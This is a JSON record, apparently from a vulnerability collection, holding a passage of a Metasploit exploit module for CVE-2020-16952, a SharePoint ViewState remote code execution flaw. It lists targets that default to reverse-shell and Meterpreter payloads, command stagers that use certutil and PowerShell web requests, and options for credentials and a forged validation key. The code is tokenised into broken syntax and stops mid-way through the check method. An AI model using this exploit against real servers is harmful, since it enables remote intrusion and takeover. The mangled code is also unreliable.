{
    "text": "vul_name : Microsoft SharePoint SSI / ViewState Remote Code Execution ， vul_cve : CVE-2020-16952 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : ViewState ， include Msf : Exploit : CmdStager ， include Msf : Exploit : Powershell ， super (  ， update_info (  ， info ,  ， 'Name' => 'Microsoft SharePoint Server-Side Include and ViewState RCE' ,  ， 'Description' => %q{ ， This module exploits a server-side include ( SSI ) in SharePoint to leak ， the web.config file and forge a malicious ViewState with the extracted ， validation key. ， This exploit is authenticated and requires a user with page creation ， privileges , which is a standard permission in SharePoint. ， The web.config file will be stored in loot once retrieved , and the ， VALIDATION_KEY option can be set to short-circuit the SSI and trigger ， the ViewState deserialization. ， Tested against SharePoint 2019 on Windows Server 2016. ， } ,  ， 'Author' => [  ， 'mr_me' ,  # Discovery and exploit ， 'wvu' # Module ，  ]  ,  ， ' ，  [ 'CVE' , '2020-16952' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2020-10-13' ,  # Public disclosure ， 'License' => MSF_LICENSE ,  ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Windows Command' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : win_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' ， } ，  ]  ,  ，  [  ， 'Windows Dropper' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : win_dropper ,  ， 'CmdStagerFlavor' => %i [ psh_invokewebrequest certutil vbs ]  ,  ， 'DefaultOptions' => { ， 'CMDSTAGER : FLAVOR' => : psh_invokewebrequest ,  ， 'PAYLOAD' => 'windows/x64/meterpreter_reverse_https' ， } ，  ]  ,  ，  [  ， 'PowerShell Stager' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : psh_stager ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/x64/meterpreter/reverse_https' ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 2 ,  ， 'DefaultOptions' => { ， 'DotNetGadgetChain' => : TypeConfuseDelegate ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ UNRELIABLE_SESSION ]  ,  # SSI may fail the second time ， 'SideEffects' => [ IOC_IN_LOGS , CONFIG_CHANGES , ARTIFACTS_ON_DISK ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ,  ， OptString.new ( 'VALIDATION_KEY' ,  [ false , 'ViewState validation key' ]  )  ,  ，  # \"Promote\" these advanced options so we don't have to pass around our own ， OptString.new ( 'HttpUsername' ,  [ false , 'SharePoint username' ]  )  ,  ， OptString.new ( 'HttpPassword' ,  [ false , 'SharePoint password' ]  )  ，  ]  )  ， end ， def post_auth? ， true ， end ， def username ， datastore [ 'HttpUsername' ]  ， end ， def password ， datastore [ 'HttpPassword' ]  ， end ， def vuln_builds ，  [  ，  [ Gem : Version.new ( '15.0.0.4571' )  , Gem : Version.new ( '15.0.0.5275' )  ]  ,  # SharePoint 2013 ，  [ Gem : Version.new ( '16.0.0.4351' )  , Gem : Version.new ( '16.0.0.5056' )  ]  ,  # SharePoint 2016 ，  [ Gem : Version.new ( '16.0.0.10337' )  , Gem : Version.new ( '16.0.0.10366' )  ]  # SharePoint 2019 ，  ]  ， end ， def check ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path )  ， unless res",
    "time": "2020.10.19"
}